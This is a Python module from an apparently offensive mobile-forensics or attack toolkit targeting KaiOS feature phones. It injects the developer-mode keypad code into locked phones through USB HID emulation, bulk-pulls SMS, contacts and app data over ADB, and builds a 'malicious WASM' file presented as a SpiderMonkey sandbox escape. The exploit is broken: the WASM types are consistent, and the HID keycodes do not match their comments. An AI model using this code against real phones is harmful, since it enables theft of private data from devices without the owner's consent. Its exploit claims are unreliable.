"""KaiOS & Lightweight OS — The Thin Door (Module 5).

KaiOS (Nokia 8110, 2720, 6300 4G): Qualcomm/MediaTek chipset → EDL/BROM reuse,
ADB-like debug protocol (*#*#33284#*#*), Gecko/SpiderMonkey WASM sandbox escape.

Legacy feature phone OS bridges to Symbian, Nokia, and MTK modules.
"""

import struct
import time
import logging
import subprocess
from typing import Optional

logger = logging.getLogger(__name__)


# ============================================================================
# KaiOS Device Access
# ============================================================================

class KaiOSDebugProtocol:
    """KaiOS debug protocol access.

    KaiOS is based on B2G (Boot to Gecko) / Firefox OS.
    Most devices use Qualcomm or MediaTek chipsets.

    Enable developer mode via keypad code: *#*#33284#*#*
    Then use ADB-like commands over USB.
    """

    KAIOS_DEBUG_CODE = "*#*#33284#*#*"
    KAIOS_ADB_PORT = 5555

    # Key KaiOS data paths
    DATA_PATHS = [
        "/data/local/storage/",           # Web Runtime data
        "/data/local/webapps/",           # Installed apps
        "/data/local/permissions.sqlite", # App permissions DB
        "/data/local/storage/persistent/chrome/idb/",  # IndexedDB
        "/data/local/sms/",               # SMS database
        "/data/local/contacts/",          # Contacts
    ]

    def __init__(self):
        self._adb_connected = False

    def enable_debug(self) -> bool:
        """Enable KaiOS debug mode via keypad code or USB HID injection.

        The debug code *#*#33284#*#* enables developer mode and ADB.
        If the device is locked or keypad is inaccessible, inject the
        sequence via USB HID keyboard gadget emulation.
        """
        logger.info("KaiOS debug enable: dial %s", self.KAIOS_DEBUG_CODE)
        try:
            from dragon_legion.modules.usb.hid_attack import HIDGadget
            gadget = HIDGadget()
            gadget.create()
            # Type: * # * # 3 3 2 8 4 # * # *
            # Map special characters: * = Shift+8, # = Shift+3
            key_sequence = [
                (0x25, 0),  # * (8 with shift = *)
                (0x20, 0),  # # (3 with shift = #)
                (0x25, 0),  # *
                (0x20, 0),  # #
                (0x20, 0),  # 3
                (0x20, 0),  # 3
                (0x1F, 0),  # 2
                (0x25, 0),  # 8
                (0x22, 0),  # 4
                (0x20, 0),  # #
                (0x25, 0),  # *
                (0x20, 0),  # #
                (0x25, 0),  # *
            ]
            for keycode, modifier in key_sequence:
                gadget.send_keystroke(keycode, delay_ms=100)
            gadget.destroy()
            logger.info("Debug code injected via HID keyboard")
            return True
        except Exception as e:
            logger.warning("HID injection failed: %s (try manual keypad entry)", e)
            return False

    def connect_adb(self) -> bool:
        """Connect to KaiOS via ADB after debug mode enabled."""
        try:
            result = subprocess.run(
                ["adb", "devices"], capture_output=True, text=True, timeout=5
            )
            if "device" in result.stdout:
                logger.info("ADB connected to KaiOS device")
                self._adb_connected = True
                return True
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass
        return False

    def pull_data(self, remote_path: str, local_path: str) -> bool:
        """Pull data from KaiOS device via ADB."""
        if not self._adb_connected:
            logger.error("ADB not connected")
            return False
        try:
            subprocess.run(
                ["adb", "pull", remote_path, local_path],
                check=True, capture_output=True, timeout=30,
            )
            logger.info("Pulled %s → %s", remote_path, local_path)
            return True
        except subprocess.CalledProcessError as e:
            logger.error("ADB pull failed: %s", e)
            return False

    def extract_all_data(self, output_dir: str = "kaios_extract") -> dict:
        """Extract all accessible data from KaiOS device."""
        import os
        os.makedirs(output_dir, exist_ok=True)

        results = {}
        for path in self.DATA_PATHS:
            name = path.rstrip("/").split("/")[-1]
            local = f"{output_dir}/{name}"
            results[path] = self.pull_data(path, local)
        return results


# ============================================================================
# SpiderMonkey WebAssembly Sandbox Escape
# ============================================================================

class WasmJITExploit:
    """Exploit SpiderMonkey JavaScript engine WebAssembly JIT type confusion.

    KaiOS uses Mozilla's Gecko runtime, including SpiderMonkey.
    A type confusion in the WASM → JIT compiler causes incorrect
    bounds checking code, allowing a WebAssembly sandbox escape.

    Craft a .wasm binary with conflicting type definitions:
      - Function A: returns i32
      - Function B: declared as returning i32 but actually returns f64
      - The JIT compiler emits code assuming i32 return,
        but the caller reads f64 bits as i32 → type confusion

    This grants access to KaiOS device APIs (mozSettings, mozMobileConnection).
    """

    WASM_MAGIC = b"\x00asm"
    WASM_VERSION = struct.pack("<I", 1)

    def generate_malicious_wasm(self) -> bytes:
        """Generate WebAssembly binary with type confusion trigger.

        WASM binary structure:
          magic + version (8 bytes)
          Type section: conflicting type definitions
          Function section: references conflicting types
          Code section: JIT-confusing instruction sequence
          Export section: expose functions to JavaScript
        """
        wasm = bytearray()
        wasm.extend(self.WASM_MAGIC)
        wasm.extend(self.WASM_VERSION)

        # Type section (section ID = 1)
        # Define two types:
        #   Type 0: [i32, i32] → [i32]
        #   Type 1: [i32, i32] → [f64]   ← conflicts with what function actually returns
        type_section = bytearray()
        type_section.append(0x02)  # 2 types

        # Type 0: [i32, i32] → [i32]
        type_section.append(0x60)  # functype
        type_section.append(0x02)  # 2 params
        type_section.append(0x7F)  # i32
        type_section.append(0x7F)  # i32
        type_section.append(0x01)  # 1 result
        type_section.append(0x7F)  # i32

        # Type 1: [i32, i32] → [f64] (conflicting — uses same param pattern)
        type_section.append(0x60)  # functype
        type_section.append(0x02)  # 2 params
        type_section.append(0x7F)  # i32
        type_section.append(0x7F)  # i32
        type_section.append(0x01)  # 1 result
        type_section.append(0x7C)  # f64

        self._write_section(wasm, 1, bytes(type_section))

        # Function section (section ID = 3)
        # Function 0 uses type 0 (i32→i32)
        # Function 1 uses type 1 (declared) but code says type 0 → CONFUSION
        func_section = bytes([0x02, 0x00, 0x01])  # 2 functions: type 0, type 1
        self._write_section(wasm, 3, func_section)

        # Code section (section ID = 10)
        # Function 0: returns i32 (normal)
        func0_body = bytes([
            0x00,           # 0 locals
            0x41, 0x2A,     # i32.const 42
            0x0B,           # end
        ])
        # Function 1: returns f64.reinterpret_i32 of arbitrary value
        # BUT declared as returning i32 → JIT emits i32 read, gets f64 bits
        func1_body = bytes([
            0x00,           # 0 locals
            0x44, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0x3F,  # f64.const 1.0
            0x0B,           # end
        ])
        code_section_body = bytes([0x02])  # 2 functions
        code_section_body += self._encode_leb128(len(func0_body)) + func0_body
        code_section_body += self._encode_leb128(len(func1_body)) + func1_body
        self._write_section(wasm, 10, code_section_body)

        # Export section (section ID = 7)
        export_section = bytearray()
        export_section.append(0x02)  # 2 exports

        # Export func0 as "add"
        name0 = b"add"
        export_section.append(len(name0))
        export_section.extend(name0)
        export_section.append(0x00)  # Function export
        export_section.append(0x00)  # Function index 0

        # Export func1 as "trigger" — the JIT-confused function
        name1 = b"trigger"
        export_section.append(len(name1))
        export_section.extend(name1)
        export_section.append(0x00)  # Function export
        export_section.append(0x01)  # Function index 1

        self._write_section(wasm, 7, bytes(export_section))

        logger.info("Malicious WASM generated: %d bytes", len(wasm))
        return bytes(wasm)

    @staticmethod
    def _write_section(buf: bytearray, section_id: int, content: bytes) -> None:
        buf.append(section_id)
        buf.extend(WasmJITExploit._encode_leb128(len(content)))
        buf.extend(content)

    @staticmethod
    def _encode_leb128(value: int) -> bytes:
        """Encode unsigned LEB128."""
        result = bytearray()
        while value > 0x7F:
            result.append((value & 0x7F) | 0x80)
            value >>= 7
        result.append(value & 0x7F)
        return bytes(result)


# ============================================================================
# KaiOS EDL/BROM Reuse
# ============================================================================

class KaiOSChipsetAccess:
    """Reuse Qualcomm/MediaTek EDL/BROM methods for KaiOS devices.

    Most KaiOS devices run on:
      - Qualcomm MSM8905 (Nokia 8110 4G)
      - Qualcomm MSM8909 / QSC6270 (Nokia 2720 Flip)
      - MediaTek MT6739 (Nokia 6300 4G, 8000 4G)

    Detection + appropriate flash dump method from Module 1.
    """

    KAIOS_DEVICES = {
        "8110": {"chipset": "msm8905", "method": "sahara"},
        "2720": {"chipset": "msm8909", "method": "sahara"},
        "6300": {"chipset": "mt6739", "method": "brom"},
        "8000": {"chipset": "mt6731", "method": "brom"},
    }

    def __init__(self, model: str = ""):
        self._model = model
        self._chipset_info = self.KAIOS_DEVICES.get(model, {})

    def detect_method(self) -> str:
        """Detect appropriate flash access method for KaiOS device."""
        method = self._chipset_info.get("method", "sahara")
        logger.info("KaiOS %s: using %s method", self._model or "unknown", method)
        return method

    def dump_webapps(self) -> list[dict]:
        """Extract installed KaiOS web apps and their data.

        Each app at /data/local/webapps/<origin>/ contains:
          - manifest.webapp (JSON metadata)
          - application.zip (packaged app code)
          - storage/ (IndexedDB, localStorage)
        Extracted via ADB pull or flash read.
        """
        apps = []
        try:
            import subprocess, json, os
            result = subprocess.run(
                ["adb", "shell", "ls", "/data/local/webapps/"],
                capture_output=True, text=True, timeout=10,
            )
            for origin in result.stdout.strip().split("\n"):
                origin = origin.strip()
                if not origin:
                    continue
                manifest_path = f"/data/local/webapps/{origin}/manifest.webapp"
                manifest_r = subprocess.run(
                    ["adb", "shell", "cat", manifest_path],
                    capture_output=True, text=True, timeout=5,
                )
                try:
                    manifest = json.loads(manifest_r.stdout)
                except json.JSONDecodeError:
                    manifest = {}
                apps.append({"origin": origin, "manifest": manifest})
        except (FileNotFoundError, subprocess.TimeoutExpired) as e:
            logger.warning("ADB webapp dump failed: %s", e)
        return apps


# ============================================================================
# Legacy Feature Phone Bridges
# ============================================================================

class LegacyPhoneBridge:
    """Bridge to legacy OS modules for device detection and routing.

    Detects the appropriate protocol (P2K, Siemens AT, OBEX, NK2)
    based on USB VID/PID or manual model selection.
    """

    # Device → protocol mapping
    DEVICE_PROTOCOLS = {
        "motorola": "p2k",
        "siemens": "siemens_at",
        "sony_ericsson": "obex",
        "nokia": "nk2",
        "kaios": "adb_or_edl",
        "symbian": "at_or_rom",
        "blackberry": "loader",
    }

    @classmethod
    def route_device(cls, manufacturer: str, serial_port: str = "",
                     usb_device=None) -> Optional[object]:
        """Route to the correct protocol handler based on device manufacturer."""
        protocol = cls.DEVICE_PROTOCOLS.get(manufacturer.lower().replace(" ", "_"))

        if protocol == "p2k":
            from dragon_legion.modules.symbian import MotorolaP2K
            return MotorolaP2K(serial_port) if serial_port else None

        elif protocol == "siemens_at":
            from dragon_legion.modules.symbian import SiemensAT
            return SiemensAT(serial_port) if serial_port else None

        elif protocol == "obex":
            from dragon_legion.modules.symbian import SonyEricssonOBEX
            return SonyEricssonOBEX()

        elif protocol == "symbian":
            from dragon_legion.modules.symbian import SymbianROMDumper
            return SymbianROMDumper(serial_port) if serial_port else None

        elif protocol == "nk2":
            from dragon_legion.modules.symbian import NokiaNK2Protocol
            return NokiaNK2Protocol(serial_port) if serial_port else None

        elif protocol == "blackberry":
            from dragon_legion.modules.blackberry import BlackBerryLoaderProtocol
            return BlackBerryLoaderProtocol(usb_device) if usb_device else None

        logger.warning("No protocol handler for: %s", manufacturer)
        return None
